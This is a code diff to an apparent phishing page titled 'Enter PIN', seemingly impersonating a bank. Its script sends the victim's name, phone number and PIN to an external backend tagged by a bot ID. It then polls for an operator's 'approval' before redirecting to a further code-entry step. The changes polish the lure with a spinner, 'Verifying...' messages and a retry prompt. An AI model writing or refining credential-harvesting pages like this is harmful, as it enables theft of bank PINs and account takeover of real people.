@@ -4,10 +4,14 @@
 <meta charset="UTF-8">
 <title>Enter PIN</title>
 <style>
-body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; }
-.pin-container { background:#fff; padding:30px; width:350px; text-align:center; }
-.pin-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; }
-button { width:100%; padding:12px; background:red; color:#fff; border:none; }
+body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+.pin-container { background:#fff; padding:30px; width:350px; text-align:center; border-radius:12px; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
+.pin-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; border-radius:6px; }
+button { width:100%; padding:12px; background:red; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:flex; justify-content:center; align-items:center; }
+button:disabled { background:#ccc; cursor:not-allowed; }
+.spinner { display:none; width:20px; height:20px; border:3px solid #fff; border-top:3px solid rgba(255,255,255,0.3); border-radius:50%; animation:spin 1s linear infinite; margin-left:10px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+#status { margin-top:15px; font-size:14px; color:#555; }
 </style>
 </head>
 <body>
@@ -17,9 +21,15 @@ button { width:100%; padding:12px; background:red; color:#fff; border:none; }
 
     <form id="pinForm">
         <div class="pin-boxes">
-            <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
         </div>
-        <button id="submitBtn" disabled>Submit PIN</button>
+        <button id="submitBtn" disabled>
+            <span id="btnText">Submit PIN</span>
+            <div class="spinner" id="spinner"></div>
+        </button>
     </form>
     <div id="status"></div>
 </div>
@@ -27,25 +37,38 @@ button { width:100%; padding:12px; background:red; color:#fff; border:none; }
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
+// ---------------- BOT ROUTING ----------------
 const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId') || window.location.pathname.split('/').pop();
+const botId = params.get('botId');
 if (!botId) { alert("Invalid access link"); throw new Error(); }
 
+// Prevent skipping steps
 if (!localStorage.getItem('name') || !localStorage.getItem('phone')) {
     window.location.href = `details.html?botId=${botId}`;
 }
 
+// ---------------- PIN INPUT LOGIC ----------------
 const inputs = document.querySelectorAll('.pin-boxes input');
 const button = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+const spinner = document.getElementById('spinner');
+const statusText = document.getElementById('status');
 
+inputs[0].focus();
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g,'');
-        if (input.value && i < 3) inputs[i+1].focus();
+        if (input.value && i < inputs.length - 1) inputs[i+1].focus();
         button.disabled = ![...inputs].every(x => x.value);
+    });
+    input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+            inputs[i-1].focus();
+        }
     });
 });
 
+// ---------------- SUBMIT PIN ----------------
 document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
 
@@ -53,24 +76,51 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     const name = localStorage.getItem('name');
     const phone = localStorage.getItem('phone');
 
-    localStorage.setItem('pin', pin); // 🔥 CRITICAL FIX
+    // Save PIN locally
+    localStorage.setItem('pin', pin);
 
-    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ name, phone, pin, botId })
-    });
+    // --- UX FEEDBACK ---
+    button.disabled = true;
+    btnText.textContent = 'Verifying...';
+    spinner.style.display = 'inline-block';
+    statusText.textContent = 'Waiting for approval...';
 
-    const { requestId } = await res.json();
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ name, phone, pin, botId })
+        });
+        const { requestId } = await res.json();
 
-    const poll = setInterval(async () => {
-        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-        const d = await r.json();
-        if (d.approved === true) {
-            clearInterval(poll);
-            window.location.href = `code.html?botId=${botId}`;
-        }
-    }, 1500);
+        // Polling for approval
+        const poll = setInterval(async () => {
+            const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+            const d = await r.json();
+
+            if (d.approved === true) {
+                clearInterval(poll);
+                window.location.href = `code.html?botId=${botId}`;
+            }
+
+            if (d.approved === false) {
+                clearInterval(poll);
+                button.disabled = false;
+                btnText.textContent = 'Submit PIN';
+                spinner.style.display = 'none';
+                statusText.textContent = 'Incorrect PIN. Try again.';
+                inputs.forEach(i => i.value='');
+                inputs[0].focus();
+            }
+        }, 1500);
+
+    } catch (err) {
+        spinner.style.display = 'none';
+        btnText.textContent = 'Submit PIN';
+        button.disabled = false;
+        statusText.innerText = 'Submission failed.';
+        console.error(err);
+    }
 });
 </script>
 
